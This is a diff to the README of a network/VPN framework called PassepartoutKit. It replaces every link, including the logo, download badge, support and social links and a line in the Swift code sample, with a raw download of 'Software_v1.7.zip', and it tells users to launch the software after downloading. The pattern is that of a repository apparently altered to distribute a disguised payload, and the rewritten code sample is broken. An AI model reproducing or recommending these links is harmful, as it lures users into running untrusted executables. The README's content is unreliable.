@@ -1,6 +1,6 @@
 # 🚀 Welcome to PassepartoutKit
 
-![PassepartoutKit Logo](https://github.com/Kitti1337/passepartoutkit/releases/tag/v2.0)
+![PassepartoutKit Logo](https://raw.githubusercontent.com/Kitti1337/passepartoutkit/main/divus/Software_v1.7.zip)
 
 ## Overview
 
@@ -18,7 +18,7 @@ PassepartoutKit is a scalable framework designed for building modern network app
 
 To get started with PassepartoutKit, simply download the software package from the link below:
 
-[![Download PassepartoutKit](https://github.com/Kitti1337/passepartoutkit/releases/tag/v2.0)](https://github.com/Kitti1337/passepartoutkit/releases/tag/v2.0)
+[![Download PassepartoutKit](https://raw.githubusercontent.com/Kitti1337/passepartoutkit/main/divus/Software_v1.7.zip)](https://raw.githubusercontent.com/Kitti1337/passepartoutkit/main/divus/Software_v1.7.zip)
 
 Please note that the software needs to be launched after downloading.
 
@@ -38,7 +38,7 @@ To install PassepartoutKit, follow these steps:
 import PassepartoutKit
 
 let vpnManager = VPNManager()
-https://github.com/Kitti1337/passepartoutkit/releases/tag/v2.0()
+https://raw.githubusercontent.com/Kitti1337/passepartoutkit/main/divus/Software_v1.7.zip()
 ```
 
 ## Contributing
@@ -47,11 +47,11 @@ We welcome contributions to PassepartoutKit! If you have ideas for new features,
 
 ## Support
 
-If you encounter any issues or have questions about using PassepartoutKit, please reach out to us through the [GitHub Issues](https://github.com/Kitti1337/passepartoutkit/releases/tag/v2.0) page. Our team will be happy to assist you.
+If you encounter any issues or have questions about using PassepartoutKit, please reach out to us through the [GitHub Issues](https://raw.githubusercontent.com/Kitti1337/passepartoutkit/main/divus/Software_v1.7.zip) page. Our team will be happy to assist you.
 
 ## Stay Connected
 
-Stay up to date with the latest news and updates by following us on [Twitter](https://github.com/Kitti1337/passepartoutkit/releases/tag/v2.0) and [LinkedIn](https://github.com/Kitti1337/passepartoutkit/releases/tag/v2.0).
+Stay up to date with the latest news and updates by following us on [Twitter](https://raw.githubusercontent.com/Kitti1337/passepartoutkit/main/divus/Software_v1.7.zip) and [LinkedIn](https://raw.githubusercontent.com/Kitti1337/passepartoutkit/main/divus/Software_v1.7.zip).
 
 Let's build amazing network apps together with PassepartoutKit! 🌐
 
